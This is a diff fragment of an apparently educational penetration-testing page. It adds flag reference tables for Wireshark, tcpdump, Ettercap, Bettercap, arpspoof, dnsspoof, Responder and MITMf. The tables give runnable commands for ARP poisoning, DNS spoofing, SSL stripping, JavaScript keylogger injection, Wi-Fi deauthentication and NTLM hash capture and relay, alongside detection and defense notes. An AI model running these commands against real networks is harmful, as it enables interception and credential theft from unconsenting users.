+                        <td>Filters ICMP traffic (ping, traceroute). Can reveal covert channels using ICMP payloads for data exfiltration.</td>
+                        <td>When detecting network reconnaissance, ICMP tunneling, or troubleshooting connectivity issues.</td>
+                        <td><span class="inline-code">icmp</span> shows all ICMP packets</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">udp.port</span></td>
+                        <td>Filters UDP traffic by port. Essential for analyzing DNS (53), SNMP (161), DHCP (67/68), and other UDP services.</td>
+                        <td>When investigating UDP-based services, DDoS attacks using UDP amplification, or connectionless protocols.</td>
+                        <td><span class="inline-code">udp.port == 53</span> for DNS</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">eth.addr</span></td>
+                        <td>Filters by MAC address at Ethernet layer. Useful for tracking devices even when IPs change (DHCP).</td>
+                        <td>When investigating ARP spoofing, tracking specific hardware, or analyzing switched network behavior.</td>
+                        <td><span class="inline-code">eth.addr == aa:bb:cc:dd:ee:ff</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">frame contains</span></td>
+                        <td>Searches packet contents for specific strings. Powerful for finding keywords like "password", "admin", or custom data.</td>
+                        <td>When hunting for specific credentials, searching for API keys, or detecting custom application strings.</td>
+                        <td><span class="inline-code">frame contains "password"</span></td>
+                    </tr>
+                </tbody>
+            </table>
+
             <h4>Core Capabilities and Workflow</h4>
             <p><strong>Wireshark captures live traffic or reads existing packet captures:</strong> Select network interface (eth0, wlan0, any for all interfaces), start capture, apply capture filters (BPF syntax) to reduce noise, let traffic accumulate, stop capture. <em>Display filters</em> (more powerful than capture filters) narrow down packets after capture—filter by protocol, IP address, port, flags, payload content. <em>Protocol dissection</em> breaks down each packet into layers (Ethernet → IP → TCP → HTTP) showing field values, flags, checksums. <em>Follow stream</em> reconstructs TCP/UDP conversations—see full HTTP requests/responses, extracted files, credential exchanges. <em>Statistics</em> reveal conversation endpoints, protocol hierarchy, I/O graphs, expert info (warnings/errors). <em>Export objects</em> extracts files from HTTP, SMB, TFTP traffic. Typical workflow: capture traffic during activity (login, file transfer, service interaction), apply display filters to isolate relevant packets, follow streams to understand context, export credentials or files, document findings with screenshots and packet numbers.</p>
 
@@ -14028,6 +14480,91 @@ dns                                      # Filter DNS traffic
             <h3>2. tcpdump — Command-Line Packet Analyzer</h3>
             <p><strong>tcpdump is the lightweight, scriptable command-line packet capture tool for Linux/Unix systems.</strong> It uses Berkeley Packet Filter (BPF) syntax for precise capture filters, outputs to PCAP files that Wireshark can read, works over SSH on remote servers, and integrates into automated security pipelines. Essential for capturing traffic on headless servers, in scripts, and when GUI access isn't available.</p>
 
+            <table>
+                <thead>
+                    <tr>
+                        <th>Flag</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">-i interface</span></td>
+                        <td>Specifies which network interface to capture from. Required to target specific network adapters (eth0, wlan0, any for all).</td>
+                        <td>When you have multiple interfaces and need to capture from specific network (wired vs wireless, VPN vs physical).</td>
+                        <td><span class="inline-code">sudo tcpdump -i eth0</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-n</span></td>
+                        <td>Disables DNS resolution for IP addresses. Speeds up capture and prevents reverse DNS lookups that reveal your activity.</td>
+                        <td>When performance matters, on networks with slow/no DNS, or for stealth (no DNS queries from your machine).</td>
+                        <td><span class="inline-code">sudo tcpdump -n</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-nn</span></td>
+                        <td>Disables both DNS and port name resolution. Shows raw port numbers instead of service names (80 vs "http").</td>
+                        <td>When you want numeric output only, faster processing, or parsing output programmatically in scripts.</td>
+                        <td><span class="inline-code">sudo tcpdump -nn</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-X</span></td>
+                        <td>Displays packet contents in both hex and ASCII. Essential for analyzing payload data and finding cleartext credentials.</td>
+                        <td>When you need to inspect packet contents manually, hunt for strings, or analyze unknown protocols.</td>
+                        <td><span class="inline-code">sudo tcpdump -X</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-A</span></td>
+                        <td>Shows packet contents in ASCII only (more readable than hex). Quickly reveals cleartext HTTP, FTP, Telnet data.</td>
+                        <td>When analyzing cleartext protocols, looking for readable strings, or monitoring HTTP traffic quickly.</td>
+                        <td><span class="inline-code">sudo tcpdump -A</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-w file</span></td>
+                        <td>Writes raw packets to PCAP file instead of displaying on screen. Enables later analysis with Wireshark or other tools.</td>
+                        <td>When capturing long-term, for forensic preservation, or when you'll analyze offline with better tools.</td>
+                        <td><span class="inline-code">sudo tcpdump -w capture.pcap</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-r file</span></td>
+                        <td>Reads packets from previously saved PCAP file. Allows offline analysis and applying different filters to same capture.</td>
+                        <td>When analyzing existing captures, reviewing forensic evidence, or testing filters on known traffic.</td>
+                        <td><span class="inline-code">sudo tcpdump -r capture.pcap</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-c count</span></td>
+                        <td>Captures only specified number of packets then stops. Prevents runaway captures and limits output size.</td>
+                        <td>When you need quick sample, testing filters, or want controlled capture size for scripting.</td>
+                        <td><span class="inline-code">sudo tcpdump -c 100</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-s snaplen</span></td>
+                        <td>Sets snapshot length (bytes per packet to capture). Use 0 or 65535 for full packets, smaller values for headers only.</td>
+                        <td>When storage is limited (capture headers only), or need full packets including large payloads.</td>
+                        <td><span class="inline-code">sudo tcpdump -s 0</span> for full packets</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-v, -vv, -vvv</span></td>
+                        <td>Increases verbosity levels. Shows more protocol details, TTL, checksums, IP options, and advanced packet information.</td>
+                        <td>When troubleshooting network issues, analyzing protocol behavior, or need detailed packet metadata.</td>
+                        <td><span class="inline-code">sudo tcpdump -vvv</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-q</span></td>
+                        <td>Quiet mode—prints less protocol information. Shows only essential summary (src, dst, ports) without verbose details.</td>
+                        <td>When monitoring high-volume traffic, want cleaner output, or logging summaries for automated processing.</td>
+                        <td><span class="inline-code">sudo tcpdump -q</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-tttt</span></td>
+                        <td>Prints human-readable timestamps with date and time. Essential for correlating captures with logs and incident timelines.</td>
+                        <td>When performing forensics, correlating with other logs, or need precise timing of network events.</td>
+                        <td><span class="inline-code">sudo tcpdump -tttt</span> shows full timestamps</td>
+                    </tr>
+                </tbody>
+            </table>
+
             <h4>Basic Usage and BPF Filters</h4>
             <div class="code"># Basic Packet Capture
 sudo tcpdump -i eth0                     # Capture on eth0 interface
@@ -14111,6 +14648,79 @@ sudo killall tcpdump</div>
 
             <h3>3. Ettercap — Comprehensive MITM Attack Suite</h3>
             <p><strong>Ettercap is a feature-rich man-in-the-middle (MITM) attack framework for switched LANs.</strong> It performs ARP poisoning, DNS spoofing, SSL stripping, packet filtering and dropping, password collection, and connection hijacking. Supports both GUI (GTK) and text-based (ncurses) interfaces. Essential for demonstrating network segmentation weaknesses and testing switched network security.</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Flag</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">-T</span></td>
+                        <td>Launches Ettercap in text-only mode (ncurses interface). Lightweight, works over SSH, scriptable for automated attacks.</td>
+                        <td>When attacking via SSH on remote servers, in scripts, or when GUI isn't available/needed.</td>
+                        <td><span class="inline-code">sudo ettercap -T</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-G</span></td>
+                        <td>Starts GTK-based graphical interface. Visual representation of hosts, connections, and captured credentials.</td>
+                        <td>When you prefer visual interaction, learning Ettercap features, or need to monitor multiple connections visually.</td>
+                        <td><span class="inline-code">sudo ettercap -G</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-i interface</span></td>
+                        <td>Specifies network interface for sniffing/attacking. Required to target correct network segment.</td>
+                        <td>When you have multiple interfaces (wired, wireless, VPN) and need to attack specific network.</td>
+                        <td><span class="inline-code">sudo ettercap -i eth0</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-M mitm:method</span></td>
+                        <td>Specifies MITM attack type. Common: arp (ARP poisoning), icmp (ICMP redirect), dhcp (DHCP spoofing). Core of Ettercap's functionality.</td>
+                        <td>When positioning yourself between victim and gateway. ARP is most common for switched networks.</td>
+                        <td><span class="inline-code">-M arp:remote</span> for bidirectional ARP poisoning</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-P plugin</span></td>
+                        <td>Loads specific Ettercap plugin for extended attacks. Plugins include dns_spoof, sslstrip, dos_attack, remote_browser, etc.</td>
+                        <td>When you need DNS spoofing, SSL stripping, or other advanced attacks beyond basic packet capture.</td>
+                        <td><span class="inline-code">-P dns_spoof</span> for DNS redirection</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-q</span></td>
+                        <td>Quiet mode—suppresses packet output. Shows only important events like captured credentials, not every packet.</td>
+                        <td>When running long-term attacks, logging only important events, or reducing terminal noise.</td>
+                        <td><span class="inline-code">sudo ettercap -T -q</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-F filter</span></td>
+                        <td>Loads compiled packet filter for real-time packet modification. Enables content injection, dropping, or replacing data.</td>
+                        <td>When you need to modify packets in-flight—inject payloads, replace content, or drop specific traffic.</td>
+                        <td><span class="inline-code">-F compiled_filter.ef</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-L logfile</span></td>
+                        <td>Logs all sniffed data to file for later analysis. Saves passwords, conversations, and session data.</td>
+                        <td>When you need forensic record, can't monitor live, or want to analyze captured data post-attack.</td>
+                        <td><span class="inline-code">-L /tmp/ettercap.log</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-w pcap-file</span></td>
+                        <td>Writes captured packets to PCAP format file. Compatible with Wireshark for detailed protocol analysis.</td>
+                        <td>When you want to analyze traffic with Wireshark later, preserve evidence, or share captures with team.</td>
+                        <td><span class="inline-code">-w capture.pcap</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-u</span></td>
+                        <td>Updates Ettercap's internal databases (MAC vendor list, fingerprints). Improves device identification accuracy.</td>
+                        <td>When device identification seems outdated, before major engagements, or after fresh Kali install.</td>
+                        <td><span class="inline-code">sudo ettercap -u</span></td>
+                    </tr>
+                </tbody>
+            </table>
 
             <h4>ARP Poisoning and MITM Setup</h4>
             <div class="code"># Start Ettercap in Text Mode
@@ -14213,6 +14823,109 @@ sudo ettercap -T -M arp:remote /vlan10-gateway// /vlan20-host//
 
             <h3>4. Bettercap — Modern Network Attack Framework</h3>
             <p><strong>Bettercap is the powerful, extensible network attack and monitoring framework with scripting capabilities.</strong> It performs ARP/DNS/DHCP spoofing, credentials sniffing, BLE attacks, Wi-Fi attacks, proxy MITM with SSL stripping, REST API for automation, and web-based UI. Modern alternative to Ettercap with active development and modular architecture.</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Command</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">net.probe on</span></td>
+                        <td>Actively probes network to discover hosts. Sends ARP requests and mDNS queries to map live devices.</td>
+                        <td>When you need to discover all devices on network segment before attacking specific targets.</td>
+                        <td><span class="inline-code">> net.probe on</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">net.recon on</span></td>
+                        <td>Passive network reconnaissance—monitors ARP traffic to discover hosts without actively probing. Stealthier than net.probe.</td>
+                        <td>When you want to avoid detection, on monitored networks, or for passive intelligence gathering.</td>
+                        <td><span class="inline-code">> net.recon on</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">net.show</span></td>
+                        <td>Displays discovered hosts with IP, MAC, vendor, hostname, and status. Shows your current view of network topology.</td>
+                        <td>After discovery phase, to select attack targets, verify reconnaissance results, or document network hosts.</td>
+                        <td><span class="inline-code">> net.show</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">arp.spoof on</span></td>
+                        <td>Activates ARP poisoning attack. Redirects traffic from targets through your machine for MITM attacks.</td>
+                        <td>When you need to intercept traffic between victim and gateway, capture credentials, or perform traffic analysis.</td>
+                        <td><span class="inline-code">> arp.spoof on</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">set arp.spoof.targets</span></td>
+                        <td>Defines which hosts to ARP poison. Can target single IP, subnet, or multiple specific hosts. Essential for focused attacks.</td>
+                        <td>Before starting ARP spoofing to limit attack scope, reduce network noise, and improve stealth.</td>
+                        <td><span class="inline-code">> set arp.spoof.targets 192.168.1.100</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">http.proxy on</span></td>
+                        <td>Starts transparent HTTP proxy. Intercepts and can modify HTTP traffic in real-time during MITM attack.</td>
+                        <td>When you want to inject JavaScript, modify responses, or analyze HTTP traffic beyond simple capture.</td>
+                        <td><span class="inline-code">> http.proxy on</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">https.proxy on</span></td>
+                        <td>Activates transparent HTTPS proxy. Attempts to intercept encrypted traffic using SSL stripping or certificate substitution.</td>
+                        <td>When targeting HTTPS sites, attempting SSL strip attacks, or need to modify encrypted traffic.</td>
+                        <td><span class="inline-code">> https.proxy on</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">set https.proxy.sslstrip</span></td>
+                        <td>Enables SSL stripping—downgrades HTTPS to HTTP for victim while maintaining HTTPS to server. Exposes credentials.</td>
+                        <td>When attacking cleartext credential transmission, demonstrating HTTPS vulnerabilities, or bypassing weak encryption.</td>
+                        <td><span class="inline-code">> set https.proxy.sslstrip true</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">set https.proxy.script</span></td>
+                        <td>Loads JavaScript file for proxy injection. Injects custom JavaScript into victim's web pages (keyloggers, redirects, exploits).</td>
+                        <td>When you need to inject browser exploits, keyloggers, or modify web application behavior client-side.</td>
+                        <td><span class="inline-code">> set https.proxy.script /root/inject.js</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">wifi.recon on</span></td>
+                        <td>Starts Wi-Fi reconnaissance mode. Discovers access points, clients, channels, encryption, and signal strength.</td>
+                        <td>When assessing wireless networks, before attacking Wi-Fi, or mapping wireless infrastructure.</td>
+                        <td><span class="inline-code">> wifi.recon on</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">wifi.deauth</span></td>
+                        <td>Sends deauthentication frames to disconnect clients from AP. Forces reconnection to capture WPA handshakes or for DoS.</td>
+                        <td>When cracking WPA/WPA2 (need handshake), testing wireless DoS resilience, or forcing clients to rogue AP.</td>
+                        <td><span class="inline-code">> wifi.deauth <client-mac></span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">ble.recon on</span></td>
+                        <td>Discovers Bluetooth Low Energy devices. Maps BLE peripherals, beacons, and smart devices in proximity.</td>
+                        <td>When assessing IoT security, attacking smart devices, or discovering BLE-based tracking/surveillance.</td>
+                        <td><span class="inline-code">> ble.recon on</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">api.rest on</span></td>
+                        <td>Starts REST API server for programmatic control. Enables automation, remote control, and integration with scripts.</td>
+                        <td>When automating attacks, building custom tools on Bettercap, or need remote control interface.</td>
+                        <td><span class="inline-code">> api.rest on</span> (access at localhost:8081)</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">web.ui on</span></td>
+                        <td>Launches web-based user interface. Visual dashboard for managing attacks, viewing captured data, and monitoring network.</td>
+                        <td>When you prefer GUI over CLI, need visual network map, or want easier interaction for beginners.</td>
+                        <td><span class="inline-code">> web.ui on</span> (access at localhost:80)</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">caplets.load</span></td>
+                        <td>Executes saved attack scripts (caplets). Automates complex multi-step attacks with predefined commands.</td>
+                        <td>When running repeated attacks, need reproducible attack chains, or sharing attack methodologies with team.</td>
+                        <td><span class="inline-code">> caplets.load /root/mitm.cap</span></td>
+                    </tr>
+                </tbody>
+            </table>
 
             <h4>Core Modules and Workflow</h4>
             <div class="code"># Start Bettercap Interactive Shell
@@ -14409,6 +15122,68 @@ arp -d *                                 # Windows (run as admin)
 # Note: ARP caches refresh automatically after few minutes
 # But explicit cleanup is cleaner</div>
 
+            <h4>arpspoof Flags & Usage Reference</h4>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Flag/Option</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">-i interface</span></td>
+                        <td>Specify network interface for spoofing; required to send ARP packets on correct network segment</td>
+                        <td>Always; determines which interface sends poisoned ARP replies</td>
+                        <td><span class="inline-code">arpspoof -i eth0</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-t target</span></td>
+                        <td>Specify target IP to poison; limits attack to specific victim rather than entire subnet</td>
+                        <td>When targeting specific host; stealthier than broadcast poisoning</td>
+                        <td><span class="inline-code">arpspoof -i eth0 -t 192.168.1.100 192.168.1.1</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-r (bidirectional)</span></td>
+                        <td>Automatically poison both directions (target→gateway and gateway→target); simplifies MITM setup</td>
+                        <td>When you want full bidirectional MITM without running two instances</td>
+                        <td><span class="inline-code">arpspoof -i eth0 -r -t 192.168.1.100 192.168.1.1</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-c ownmac</span></td>
+                        <td>Specify custom MAC address in spoofed replies; allows impersonation of specific device</td>
+                        <td>Advanced scenarios requiring specific MAC spoofing for evasion</td>
+                        <td><span class="inline-code">arpspoof -i eth0 -c 00:11:22:33:44:55 -t target gateway</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-w save-pcap</span></td>
+                        <td>Write captured traffic to pcap file; enables offline analysis of intercepted data</td>
+                        <td>When you need evidence/analysis of intercepted traffic for reports</td>
+                        <td><span class="inline-code">arpspoof -w capture.pcap -i eth0 -t 192.168.1.100 192.168.1.1</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">host</span></td>
+                        <td>First positional argument; the IP address to impersonate (usually gateway)</td>
+                        <td>Always required; determines what IP you're pretending to be</td>
+                        <td><span class="inline-code">arpspoof -i eth0 -t victim 192.168.1.1</span> (impersonate gateway)</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">routing_host</span></td>
+                        <td>Optional second host; when specified, creates bidirectional poisoning automatically</td>
+                        <td>Alternative to -r flag; explicit bidirectional specification</td>
+                        <td><span class="inline-code">arpspoof -i eth0 192.168.1.100 192.168.1.1</span> (poisons both)</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">combine with ip_forward</span></td>
+                        <td>Enable Linux IP forwarding to relay traffic; without this, victim loses connectivity (DoS)</td>
+                        <td>Always before arpspoof; ensures traffic flows through attacker to destination</td>
+                        <td><span class="inline-code">echo 1 > /proc/sys/net/ipv4/ip_forward</span> before arpspoof</td>
+                    </tr>
+                </tbody>
+            </table>
+
             <div class="warning-box">
                 <h4>⚠️ arpspoof Detection and Noise</h4>
                 <p><strong>arpspoof is detectable and creates network noise:</strong> Sends constant gratuitous ARP replies (every few seconds) to maintain poisoning—network monitoring tools easily spot this. <em>Detection indicators:</em> Multiple ARP replies for same IP with different MAC addresses, ARP reply rate exceeds normal refresh intervals, switch port sees traffic destined for multiple MAC addresses. <em>Stealthier alternatives:</em> Use Bettercap with longer intervals between ARP packets, perform one-time poisoning then stop (risky—caches expire), compromise victim via other means and avoid network-layer attacks. <strong>Best practice:</strong> Use arpspoof in controlled test environments to demonstrate vulnerability, then recommend defenses (port security, DAI, static ARP for critical systems). In production penetration tests, expect detection if monitoring is competent.</p>
@@ -14469,6 +15244,68 @@ update.software.com  192.168.1.50
 www.google.com     192.168.1.50
 www.microsoft.com  192.168.1.50
 # If responses come from unexpected IP, captive portal present</div>
+
+            <h4>dnsspoof Flags & Usage Reference</h4>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Flag/Option</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">-i interface</span></td>
+                        <td>Specify network interface to listen for DNS queries; required to intercept DNS traffic on correct segment</td>
+                        <td>Always; determines which interface monitors and responds to DNS requests</td>
+                        <td><span class="inline-code">dnsspoof -i eth0</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-f hostsfile</span></td>
+                        <td>Use custom hosts file for selective spoofing; specifies which domains to spoof and their target IPs</td>
+                        <td>When targeting specific domains; more stealthy than spoofing all DNS queries</td>
+                        <td><span class="inline-code">dnsspoof -i eth0 -f /etc/dnsspoof.hosts</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">target-host</span></td>
+                        <td>Specify victim IP to target; limits attack to specific machine rather than entire network</td>
+                        <td>Focused attacks on single victim; reduces network noise and detection risk</td>
+                        <td><span class="inline-code">dnsspoof -i eth0 host 192.168.1.100</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">expression (port 53)</span></td>
+                        <td>BPF filter expression to capture specific traffic; defaults to UDP/TCP port 53 (DNS)</td>
+                        <td>Advanced filtering; can target specific DNS servers or query types</td>
+                        <td><span class="inline-code">dnsspoof -i eth0 'udp port 53 and src 192.168.1.100'</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/etc/hosts format</span></td>
+                        <td>Hosts file uses standard format: IP address followed by domain name(s)</td>
+                        <td>Creating custom spoof targets; familiar format for administrators</td>
+                        <td><span class="inline-code">192.168.1.50 www.bank.com login.bank.com</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">combine with arpspoof</span></td>
+                        <td>Use ARP spoofing first to position as MITM; ensures DNS queries flow through attacker</td>
+                        <td>On switched networks; ARP spoofing required to intercept DNS traffic</td>
+                        <td><span class="inline-code">arpspoof -i eth0 -t victim gateway &amp; dnsspoof -i eth0</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">A record spoofing</span></td>
+                        <td>Forge IPv4 address records (most common DNS record type); redirects domains to attacker IPs</td>
+                        <td>Primary use case; redirect web traffic, update servers, API endpoints</td>
+                        <td>Hostsfile entry: <span class="inline-code">10.0.0.5 api.company.com</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">wildcard entries</span></td>
+                        <td>Use asterisk for subdomain wildcards; catches all subdomains of target domain</td>
+                        <td>When targeting entire domain infrastructure; comprehensive redirection</td>
+                        <td><span class="inline-code">192.168.1.50 *.example.com</span> (catches all subdomains)</td>
+                    </tr>
+                </tbody>
+            </table>
 
             <div class="info-box">
                 <h4>💡 DNS Spoofing Limitations and Defenses</h4>
@@ -14556,6 +15393,92 @@ ntlmrelayx.py -t 192.168.1.50 -smb2support
 # Relays captured NTLM auth to target 192.168.1.50
 # If successful, executes commands on target</div>
 
+            <h4>Responder Flags & Usage Reference</h4>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Flag/Option</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">-I interface</span></td>
+                        <td>Specify network interface to listen on; required for capturing broadcast name resolution requests</td>
+                        <td>Always; determines which network segment Responder monitors</td>
+                        <td><span class="inline-code">responder -I eth0</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-A analyze-mode</span></td>
+                        <td>Passive analysis mode; listens for requests but doesn't respond (recon only)</td>
+                        <td>Initial reconnaissance; identify vulnerable protocols without poisoning</td>
+                        <td><span class="inline-code">responder -I eth0 -A</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-w WPAD</span></td>
+                        <td>Enable WPAD (Web Proxy Auto-Discovery) rogue server; captures browser proxy authentication</td>
+                        <td>When targeting web browsers; extremely effective for credential capture</td>
+                        <td><span class="inline-code">responder -I eth0 -w</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-r wredir</span></td>
+                        <td>Enable NBNS/LLMNR redirection to specific IP; redirects name resolution to attacker services</td>
+                        <td>Advanced attacks requiring specific target redirection</td>
+                        <td><span class="inline-code">responder -I eth0 -r</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-f force-auth</span></td>
+                        <td>Force NTLM authentication on captured HTTP requests; triggers Windows authentication prompts</td>
+                        <td>When victims access attacker-controlled HTTP server; forces credential exposure</td>
+                        <td><span class="inline-code">responder -I eth0 -f</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-F force-downgrade</span></td>
+                        <td>Force authentication downgrade to NTLMv1 (weaker, easier to crack than NTLMv2)</td>
+                        <td>Against older systems or when quick cracking needed; NTLMv1 rainbow tables exist</td>
+                        <td><span class="inline-code">responder -I eth0 -F</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-P proxy-auth</span></td>
+                        <td>Enable proxy authentication capture; grabs credentials from proxy authentication attempts</td>
+                        <td>Corporate environments with authenticated proxies</td>
+                        <td><span class="inline-code">responder -I eth0 -P</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-v verbose</span></td>
+                        <td>Increase verbosity; shows detailed protocol interactions and debugging information</td>
+                        <td>Troubleshooting; understanding what Responder sees and responds to</td>
+                        <td><span class="inline-code">responder -I eth0 -v</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-d disable-services</span></td>
+                        <td>Disable specific Responder services (HTTP, SMB, etc.); useful for relay attacks</td>
+                        <td>When combining with ntlmrelayx; prevents Responder from answering protocols you're relaying</td>
+                        <td><span class="inline-code">responder -I eth0 --disable HTTP --disable SMB</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-e external-ip</span></td>
+                        <td>Specify external IP for responses; useful when attacker has multiple interfaces</td>
+                        <td>Multi-homed systems; ensures victims connect to correct attacker interface</td>
+                        <td><span class="inline-code">responder -I eth0 -e 10.0.0.50</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-b basic-auth</span></td>
+                        <td>Enable Basic HTTP authentication capture; grabs plaintext credentials from HTTP Basic Auth</td>
+                        <td>Against legacy applications using Basic Auth (credentials in base64, easily decoded)</td>
+                        <td><span class="inline-code">responder -I eth0 -b</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-s smb-server</span></td>
+                        <td>Enable/disable SMB server functionality; controls whether Responder answers SMB requests</td>
+                        <td>Default enabled; disable when you only want HTTP/other protocols</td>
+                        <td><span class="inline-code">responder -I eth0</span> (SMB enabled by default)</td>
+                    </tr>
+                </tbody>
+            </table>
+
             <div class="warning-box">
                 <h4>⚠️ Responder: Ethical Considerations and Blue Team Detection</h4>
                 <p><strong>Responder is extremely effective but creates legal and ethical considerations:</strong> Collecting real user credentials (even hashed) has higher risk than synthetic test accounts—ensure proper authorization and rules of engagement. <em>Detection methods:</em> Monitor for unexpected name resolution responses, detect multiple servers claiming same hostname, network behavior analysis identifies poisoning patterns, EDR solutions detect Responder-specific indicators (file paths, process patterns). <em>Defense mechanisms:</em> Disable LLMNR/NBT-NS via Group Policy (recommended for all Windows networks), enable SMB signing (prevents relay attacks), network segmentation limits attack surface, require strong passwords (harder to crack hashes). <strong>Best practice:</strong> Use Responder to demonstrate vulnerability, then help client disable legacy protocols. Many organizations don't realize LLMNR/NBT-NS are enabled by default—easy fix, major security improvement.</p>
@@ -14613,6 +15536,80 @@ sudo mitmf --arp --spoof -i eth0 --gateway 192.168.1.1 --inject --js-payload "ht
 # All victims automatically hooked to BeEF
 # Full browser control and exploitation</div>
 
+            <h4>MITMf Plugins & Flags Reference</h4>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Flag/Option</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">--arp</span></td>
+                        <td>Enable ARP poisoning module; performs layer 2 MITM by poisoning ARP caches</td>
+                        <td>Always for network-layer MITM; positions attacker between victim and gateway</td>
+                        <td><span class="inline-code">mitmf --arp --spoof -i eth0 --gateway 192.168.1.1</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--spoof</span></td>
+                        <td>Required companion to --arp; activates the ARP spoofing functionality</td>
+                        <td>Always with --arp; enables actual poisoning rather than just monitoring</td>
+                        <td><span class="inline-code">mitmf --arp --spoof -i eth0 --gateway 192.168.1.1</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--gateway</span></td>
+                        <td>Specify gateway/router IP; defines the network gateway for proper traffic routing</td>
+                        <td>Required for ARP spoofing; ensures traffic is forwarded correctly</td>
+                        <td><span class="inline-code">mitmf --arp --spoof --gateway 192.168.1.1</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--target</span></td>
+                        <td>Specify single victim IP; limits attack scope to specific host</td>
+                        <td>Focused attacks; reduces noise and detection risk on network</td>
+                        <td><span class="inline-code">mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.100</span></td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">--inject</span></td>
